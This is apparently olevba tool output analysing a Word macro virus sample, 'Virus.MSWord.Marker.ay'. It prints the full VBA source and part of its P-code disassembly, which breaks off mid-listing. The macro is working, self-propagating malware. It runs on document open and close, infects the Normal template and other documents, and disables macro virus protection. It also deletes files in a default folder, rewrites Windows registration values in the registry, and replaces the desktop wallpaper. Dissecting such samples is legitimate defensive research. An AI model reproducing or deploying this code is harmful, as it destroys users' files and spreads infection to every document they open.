olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ay
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ay - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Seline, Where are you dear
Const Marker = "<- this is a marker! by jonhehehe TheBest"
Private Sub AutoClose()
Document_Close
End Sub
Private Sub FileOpen()
WordBasic.disableautomacros True
If Dialogs(80).Show <> 0 Then Document_Open
End Sub
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim Jon, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.*"
Options.VirusProtection = False
Application.UserName = "JonMMx 2000"
Application.UserInitials = "MeMeX"
Application.UserAddress = "JonMMx2000@yahoo.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
InsertIon:
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DI = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   Jon = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   Jon = Jon & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
   NT.CodeModule.AddFromString Jon
   For Each nmod In NormalTemplate.VBProject.VBComponents
    If Not nmod.Name = "ThisDocument" Then _
       Application.OrganizerDelete NormalTemplate.FullName, nmod.Name, 3
   Next
   NormalTemplate.VBProject.VBComponents.Add vbext_ct_StdModule
   For Each nmod In NormalTemplate.VBProject.VBComponents
    If Not nmod.Name = "ThisDocument" Then
      nmod.Name = "NewMacros"
      isd = "Private Sub AutoExec" & Chr(13) & _
      "On Error Resume Next" & Chr(13) & _
      "Dim Chri" & Chr(13) & _
      "Chri = System.PrivateProfileString(" & Chr(34) & Chr(34) & ", " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion" & Chr(34) & ", " & Chr(34) & "ProductName" & Chr(34) & ")" & Chr(13) & _
      "If Not Chri = " & Chr(34) & "JonMMx 2000" & Chr(34) & " Then" & Chr(13) & _
      "   System.PrivateProfileString(" & Chr(34) & Chr(34) & ", " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion" & Chr(34) & ", " & Chr(34) & "ProductName" & Chr(34) & ") = " & Chr(34) & "JonMMx 2000" & Chr(34) & Chr(13) & _
      "   System.PrivateProfileString(" & Chr(34) & Chr(34) & ", " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion" & Chr(34) & ", " & Chr(34) & "ProductID" & Chr(34) & ") = " & Chr(34) & "10701-OEM-0010907-06212" & Chr(34) & Chr(13) & _
      "   System.PrivateProfileString(" & Chr(34) & Chr(34) & ", " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion" & Chr(34) & ", " & Chr(34) & "ProductKey" & Chr(34) & ") = " & Chr(34) & "D4EST-R9OY9-6YOU9-R9C68-OM2P3" & Chr(34) & Chr(13) & _
      "   System.PrivateProfileString(" & Chr(34) & Chr(34) & ", " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion" & Chr(34) & ", " & Chr(34) & "RegisteredOrganization" & Chr(34) & ") = " & Chr(34) & "fUCK up Your Live" & Chr(34) & Chr(13) & _
      "   System.PrivateProfileString(" & Chr(34) & Chr(34) & ", " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion" & Chr(34) & ", " & Chr(34) & "RegisteredOwner" & Chr(34) & ") = " & Chr(34) & "JonMMx 2000" & Chr(34) & Chr(13) & _
      "   Shell " & Chr(34) & "Command.Com /c scanreg.exe /backup" & Chr(34) & ", vbHide" & Chr(13) & _
      "End If" & Chr(13) & _
      "End Sub" & Chr(13) & _
      "Private Sub ViewVBCode" & Chr(13) & _
      "End Sub" & Chr(13) & _
      "Private Sub ToolsMacro" & Chr(13) & _
      "End Sub"
      NormalTemplate.VBProject.VBComponents(2).CodeModule.AddFromString isd
     End If
   Next
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    Jon = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    AD.CodeModule.AddFromString Jon
    For Each nmod In ActiveDocument.VBProject.VBComponents
     If Not nmod.Name = "ThisDocument" Then _
       Application.OrganizerDelete ActiveDocument.FullName, nmod.Name, 3
    Next
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\Jon.html" For Output As #1
 Print #1, "<Html><head><title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
 Print #1, "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
 Print #1, "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
 Print #1, "<font normal></center>To the very best that happen in mylife<p>"
 Print #1, "<p>Long ago and in my mind, I can see your face lonely and lost in time "
 Print #1, "<p>You were gone since yester month But the memories, never would dissapear"
 Print #1, "<p>I think of you, I THINK OF YOU.<p>"
 Print #1, "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
 Print #1, "<p>Yes it's hard to understand. Why you leaving me and all we dreaming on "
 Print #1, "<p>Dear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
 Print #1, "<p>Dear Iin, altough I can not touch your face.  I know what I can do to be with you "
 Print #1, "<p>Long ago so faraway. But the light of blue, still living with me today."
 Print #1, "<p>You were gone since yester month.  But the memories never would dissapear."
 Print #1, "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\Jon.html"
Return
End Sub
'Logfile -->


' 06:14:2518:14:25 -Kamis, 22 Jul 1999
' Jon MMx 2000
' jonthebest@hotbot.com

' 03:57:4015:57:40 -Senin, 5 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:03:316:03:03 -Senin, 5 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:05:1613:05:16 -Selasa, 6 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 



' 11:05:2511:05:25 -Kamis, 8 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:23:2722:23:27 -Minggu, 13 Des 1998
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:53:518:53:51 PM PM-Wednesday, 28 Jul 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:47:268:47:26 AM AM-Saturday, 7 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:49:56:49:05 PM PM-Tuesday, 10 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:52:337:52:33 -Kamis, 12 Agust 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:08:68:08:06 AM AM-Monday, 23 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:48:37:48:03  SIANG-Kamis, 2 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:26:1423:26:14  MALAM-Jumat, 10 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:04:1010:04:10 AM AM-Saturday, 2 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:29:228:29:22 PM PM-Thursday, 28 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:18:66:18:06 AM AM-Friday, 29 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:29:512:29:05 PM PM-Wednesday, 15 Dec 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.ay
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15938 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001A "Seline, Where are you dear"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0029 "<- this is a marker! by jonhehehe TheBest"
' 	VarDefn Marker
' Line #2:
' 	FuncDefn (Private Sub AutoClose())
' Line #3:
' 	ArgsCall Document_Close 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Private Sub FileOpen())
' Line #6:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #7:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Document_Open 0x0000 
' 	EndIf 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Private Sub Document_Open())
' Line #10:
' 	ArgsCall Document_Close 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Private Sub Document_Close())
' Line #13:
' 	Dim 
' 	VarDefn nmod (As Object)
' Line #14:
' 	Dim 
' 	VarDefn isd (As String)
' Line #15:
' 	Dim 
' 	VarDefn DS
' 	VarDefn NTS
' 	VarDefn DI
' 	VarDefn NTI (As Boolean)
' Line #16:
' 	Dim 
' 	VarDefn Jon
' 	VarDefn Users
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #17:
' 	OnError (Resume Next) 
' Line #18:
' 	LitVarSpecial (True)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #19:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0004 "\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #21:
' 	LitStr 0x000B "JonMMx 2000"
' 	Ld Application 
' 	MemSt UserName 
' Line #22:
' 	LitStr 0x0005 "MeMeX"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #23:
' 	LitStr 0x0014 "JonMMx2000@yahoo.com"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #24:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #25:
' 	GoSub InsertIon 
' Line #26:
' 	LineCont 0x0004 0A 00 03 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoSub LoggingIn 
' 	EndIf 
' Line #27:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoSub ShowMe 
' 	EndIf 
' Line #28:
' 	Label InsertIon 
' Line #29:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #30:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #31:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #32:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NTI 
' Line #33:
' 	Ld DI 
' 	Ld NTI 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #34:
' 	Ld DI 
' 	IfBlock 
' Line #35:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St NTS 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Jon 
' Line #37:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #38:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #39:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #40:
' 	Ld Users 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Users 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	ElseBlock 
' Line #43:
' 	Ld Users 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 " '"
' 	Concat 
' 	St Users 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Next 
' Line #46:
' 	LineCont 0x0010 09 00 09 00 12 00 10 00 1E 00 09 00 29 00 09 00
' 	Ld Jon 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000E "hh:mm:sc AMPM-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Users 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	St Jon 
' Line #47:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #48:
' 	Ld Jon 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #49:
' 	StartForVariable 
' 	Ld nmod 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #50:
' 	LineCont 0x0004 08 00 07 00
' 	Ld nmod 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld nmod 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	Ld vbext_ct_StdModule 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #53:
' 	StartForVariable 
' 	Ld nmod 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #54:
' 	Ld nmod 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #55:
' 	LitStr 0x0009 "NewMacros"
' 	Ld nmod 
' 	MemSt New 
' Line #56:
' 	LineCont 0x0040 09 00 06 00 10 00 06 00 17 00 06 00 46 00 06 00 5B 00 06 00 96 00 06 00 D1 00 06 00 0C 01 06 00 47 01 06 00 82 01 06 00 97 01 06 00 9E 01 06 00 A5 01 06 00 AC 01 06 00 B3 01 06 00 BA 01 06 00
' 	LitStr 0x0014 "Private Sub AutoExec"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0014 "On Error Resume Next"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0008 "Dim Chri"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0023 "Chri = System.PrivateProfileString("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000B "ProductName"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000E "If Not Chri = "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000B "JonMMx 2000"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 " Then"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001F "   System.PrivateProfileString("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000B "ProductName"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 ") = "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000B "JonMMx 2000"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001F "   System.PrivateProfileString("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "ProductID"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 ") = "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0017 "10701-OEM-0010907-06212"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001F "   System.PrivateProfileString("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A "ProductKey"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 ") = "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001D "D4EST-R9OY9-6YOU9-R9C68-OM2P3"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001F "   System.PrivateProfileString("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 ") = "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "fUCK up Your Live"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001F "   System.PrivateProfileString("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000F "RegisteredOwner"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 ") = "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000B "JonMMx 2000"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "   Shell "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0022 "Command.Com /c scanreg.exe /backup"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0008 ", vbHide"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0016 "Private Sub ViewVBCode"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0016 "Private Sub ToolsMacro"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St isd 
' Line #57:
' 	Ld isd 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	StartForVariable 
' 	Next 
' Line #60:
' 	Ld NTS 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	Ld NTI 
' 	IfBlock 
' Line #63:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St DS 
' Line #64:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Jon 
' Line #65:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #66:
' 	Ld Jon 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #67:
' 	StartForVariable 
' 	Ld nmod 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #68:
' 	LineCont 0x0004 08 00 07 00
' 	Ld nmod 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld nmod 
' 	MemLd New 
' 	LitDI2 0x0003 
